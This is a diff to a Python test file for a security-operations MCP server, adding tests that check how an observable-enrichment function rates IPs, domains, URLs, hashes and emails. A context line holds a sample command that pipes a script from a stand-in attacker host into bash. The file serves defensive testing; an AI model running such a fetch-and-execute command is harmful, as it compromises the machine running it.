@@ -16,6 +16,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 from soc_mcp_server import (  # noqa: E402
     correlate_security_events,
+    enrich_observable,
     generate_detection_package,
     generate_incident_report,
     generate_investigation_runbook,
@@ -28,6 +29,21 @@ from soc_mcp_server import (  # noqa: E402
 
 WAZUH_ALERT_PATH = "sample_data/wazuh_alert.json"
 SAMPLE_COMMAND = "curl http://evil.com/payload.sh | bash"
+SAMPLE_SHA256 = (
+    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+)
+
+ENRICH_OBSERVABLE_REQUIRED_KEYS = [
+    "status",
+    "observable_type",
+    "observable_value",
+    "observable_summary",
+    "reputation",
+    "risk_level",
+    "related_mitre",
+    "investigation_recommendations",
+    "analyst_notes",
+]
 
 RUNBOOK_REQUIRED_KEYS = [
     "status",
@@ -644,6 +660,88 @@ def test_generate_detection_package_includes_qradar() -> None:
     assert "engineering_summary" in result
 
 
+def _assert_enrich_observable_shape(result: dict) -> None:
+    for key in ENRICH_OBSERVABLE_REQUIRED_KEYS:
+        assert key in result, f"Missing key: {key}"
+
+
+def test_enrich_observable_internal_ip() -> None:
+    """enrich_observable should classify private IPs as low-risk internal addresses."""
+    result = json.loads(enrich_observable("ip", "192.168.1.50"))
+
+    _assert_enrich_observable_shape(result)
+    assert result["status"] == "ok"
+    assert result["observable_type"] == "ip"
+    assert result["risk_level"] == "low"
+    assert "internal" in result["observable_summary"].lower()
+    assert result["reputation"] == "Internal Address"
+
+
+def test_enrich_observable_public_ip() -> None:
+    """enrich_observable should flag public IPs for validation."""
+    result = json.loads(enrich_observable("ip", "8.8.8.8"))
+
+    _assert_enrich_observable_shape(result)
+    assert result["status"] == "ok"
+    assert result["risk_level"] in ("medium", "high")
+    assert len(result["investigation_recommendations"]) > 0
+    technique_ids = [entry["technique_id"] for entry in result["related_mitre"]]
+    assert "T1110" in technique_ids
+
+
+def test_enrich_observable_domain() -> None:
+    """enrich_observable should classify internal domains as low risk."""
+    result = json.loads(enrich_observable("domain", "corp.local"))
+
+    _assert_enrich_observable_shape(result)
+    assert result["status"] == "ok"
+    assert result["risk_level"] == "low"
+    assert "internal" in result["observable_summary"].lower()
+
+
+def test_enrich_observable_url() -> None:
+    """enrich_observable should raise risk for suspicious URL indicators."""
+    result = json.loads(
+        enrich_observable("url", "https://pastebin.com/raw/abc123")
+    )
+
+    _assert_enrich_observable_shape(result)
+    assert result["status"] == "ok"
+    assert result["risk_level"] in ("medium", "high")
+    technique_ids = [entry["technique_id"] for entry in result["related_mitre"]]
+    assert "T1105" in technique_ids
+
+
+def test_enrich_observable_hash() -> None:
+    """enrich_observable should identify SHA256 hashes and provide guidance."""
+    result = json.loads(enrich_observable("hash", SAMPLE_SHA256))
+
+    _assert_enrich_observable_shape(result)
+    assert result["status"] == "ok"
+    assert "sha256" in result["observable_summary"].lower()
+    assert len(result["investigation_recommendations"]) > 0
+
+
+def test_enrich_observable_email() -> None:
+    """enrich_observable should detect phishing-related email indicators."""
+    result = json.loads(
+        enrich_observable("email", "urgent-verify@helpdesk.example.com")
+    )
+
+    _assert_enrich_observable_shape(result)
+    assert result["status"] == "ok"
+    assert result["risk_level"] in ("medium", "high")
+    technique_ids = [entry["technique_id"] for entry in result["related_mitre"]]
+    assert "T1566" in technique_ids
+
+
+def test_enrich_observable_unsupported_type() -> None:
+    """Unsupported observable types should return a minimal error response."""
+    result = json.loads(enrich_observable("hostname", "server01"))
+
+    assert result == {"status": "error"}
+
+
 def main() -> None:
     test_parse_wazuh_alert_returns_status_ok()
     print("PASS: parse_wazuh_alert returns status ok")
@@ -698,6 +796,27 @@ def main() -> None:
 
     test_generate_detection_package_includes_qradar()
     print("PASS: generate_detection_package includes qradar_aql_detection")
+
+    test_enrich_observable_internal_ip()
+    print("PASS: enrich_observable internal IP")
+
+    test_enrich_observable_public_ip()
+    print("PASS: enrich_observable public IP")
+
+    test_enrich_observable_domain()
+    print("PASS: enrich_observable domain")
+
+    test_enrich_observable_url()
+    print("PASS: enrich_observable URL")
+
+    test_enrich_observable_hash()
+    print("PASS: enrich_observable hash")
+
+    test_enrich_observable_email()
+    print("PASS: enrich_observable email")
+
+    test_enrich_observable_unsupported_type()
+    print("PASS: enrich_observable unsupported type")
 
     test_investigate_security_incident_unsupported_input_type()
     print("PASS: investigate_security_incident unsupported input type")
